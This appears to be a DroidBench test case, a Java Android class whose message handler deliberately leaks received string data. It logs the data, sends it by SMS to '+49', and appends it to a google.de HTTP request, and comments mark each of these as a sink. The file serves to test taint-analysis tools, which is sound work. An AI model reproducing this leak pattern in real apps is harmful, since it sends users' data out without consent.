package de.ecspride;

import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.telephony.SmsManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class LooperThread extends Thread {
	
	public static Handler handler = new Handler() {
        public void handleMessage(Message msg) {
      	  if (msg.obj != null && msg.obj instanceof String) {
			  Log.d("DroidBench", (String) msg.obj);
			  SmsManager sms = SmsManager.getDefault();
			  sms.sendTextMessage("+49", null, (String) msg.obj, null, null);  //sink, leak
			  try {
				  connect((String) msg.obj);
			  } catch (Exception e) {
				  e.printStackTrace();
			  }
		  }
        }

		private void connect(String data) throws IOException {
			String URL = "http://www.google.de/search?q=";
			URL = URL.concat(data);
			java.net.URL url = new URL(URL);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
			conn.setRequestMethod("GET");
			conn.setDoInput(true);
			// Starts the query
			conn.connect();
			Log.d(getClass().getSimpleName(), URL);

			InputStream is = conn.getInputStream();
			if (is == null)
				return;
			StringBuilder sb = new StringBuilder();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));
			String line = null;
			try {
				while ((line = br.readLine()) != null)
					sb.append(line);
			} finally {
				br.close();
				is.close();
			}
			Log.d(getClass().getSimpleName(), sb.toString());
		}
	};
	public boolean ready = false;
	
	public void run() {
		Looper.prepare();
		ready = true;
		Looper.loop();
	}

}
